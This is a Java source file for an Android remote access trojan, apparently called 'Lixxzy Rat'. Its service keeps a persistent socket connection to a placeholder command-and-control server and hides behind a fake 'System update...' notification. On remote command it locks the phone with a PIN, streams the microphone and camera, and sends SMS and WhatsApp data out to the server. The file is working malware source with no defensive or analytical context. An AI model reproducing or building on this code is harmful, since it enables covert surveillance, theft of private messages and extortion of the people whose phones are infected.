package com.r.rat;
import android.app.*;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URI;
public class C2Service extends Service {
    private static final String TAG = "C2";
    private static final String C2_URL = "https://your-c2.example.com";
    static C2Service s_instance;
    Socket socket;
    @Override public void onCreate() {
        super.onCreate(); s_instance = this;
        NotificationChannel ch = new NotificationChannel("svc","System",NotificationManager.IMPORTANCE_MIN);
        getSystemService(NotificationManager.class).createNotificationChannel(ch);
        Notification n = new Notification.Builder(this,"svc")
            .setContentTitle("Lixxzy Rat").setContentText("System update...")
            .setSmallIcon(android.R.drawable.stat_sys_download).build();
        startForeground(1, n);
        connect();
    }
    private void connect() {
        try {
            IO.Options o = new IO.Options();
            o.reconnection = true; o.reconnectionDelay = 3000;
            o.query = "id=" + Exfil.deviceId(this) + "&model=" + Build.MODEL;
            socket = IO.socket(URI.create(C2_URL), o);
            socket.on(Socket.EVENT_CONNECT, a -> Log.d(TAG, "connected"));
            socket.on("cmd", args -> {
                if (args.length == 0) return;
                try { dispatch(new JSONObject(args[0].toString())); }
                catch (Exception e) { Log.e(TAG, "cmd", e); }
            });
            socket.connect();
        } catch (Exception e) { Log.e(TAG, "connect", e); }
    }
    private void dispatch(JSONObject c) {
        String op = c.optString("op");
        try {
            switch (op) {
                case "lock":       LockController.lock(this, c.optString("pin","")); break;
                case "unlock":     LockController.unlock(this); break;
                case "torch_on":   Torch.on(this); break;
                case "torch_off":  Torch.off(this); break;
                case "mic_start":  MicStream.start(this, socket); break;
                case "mic_stop":   MicStream.stop(); break;
                case "cam_start":  CamStream.start(this, socket, c.optString("facing","back")); break;
                case "cam_stop":   CamStream.stop(); break;
                case "sms":        Exfil.dumpSms(this, socket); break;
                case "wa":         Exfil.dumpWa(this, socket); break;
                case "live_start": LiveActivity.start(this, socket); break;
                case "live_stop":  LiveActivity.stop(); break;
                case "notif_start": NotifListener.enable(this); break;
                case "wipe_pin":   LockController.permanentUnlock(this); break;
            }
        } catch (Exception e) { Log.e(TAG, "op " + op, e); }
    }
    public static void reportLockState(String state, int attempts) {
        if (s_instance == null || s_instance.socket == null) return;
        try { JSONObject j = new JSONObject(); j.put("state", state); j.put("attempts", attempts);
              s_instance.socket.emit("lock_state", j); } catch (Exception ignored) {}
    }
    public static void emit(String ev, JSONObject o) {
        if (s_instance != null && s_instance.socket != null) s_instance.socket.emit(ev, o);
    }
    @Override public int onStartCommand(Intent i, int f, int s) { s_instance = this; return START_STICKY; }
    @Override public void onDestroy() { if (socket != null) socket.disconnect(); super.onDestroy(); }
    @Override public IBinder onBind(Intent i) { return null; }
}